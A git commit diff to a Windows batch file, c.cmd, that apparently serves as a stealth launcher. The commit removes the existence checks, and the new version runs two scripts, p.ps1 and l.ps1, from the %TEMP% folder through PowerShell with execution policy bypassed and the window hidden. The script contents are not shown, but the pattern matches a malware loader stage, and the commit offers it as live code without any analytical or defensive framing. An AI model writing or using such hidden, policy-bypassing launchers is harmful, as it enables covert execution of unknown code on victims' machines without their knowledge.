6e752e857809abae871e07f5ee25d562a1fd1e2b
whispiqx <xterm8899@gmail.com>
2025-06-14 20:23:24 +0100

    Update c.cmd

--- c.cmd
+++ c.cmd
@@ -1,14 +1,3 @@
 @echo off
-REM Check if p.ps1 exists
-IF EXIST "%TEMP%\p.ps1" (
-    PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\p.ps1"
-) ELSE (
-    echo "p.ps1 not found in %TEMP%"
-)
-
-REM Check if l.ps1 exists
-IF EXIST "%TEMP%\l.ps1" (
-    PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\l.ps1"
-) ELSE (
-    echo "l.ps1 not found in %TEMP%"
-)
+PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\p.ps1"
+PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\l.ps1"
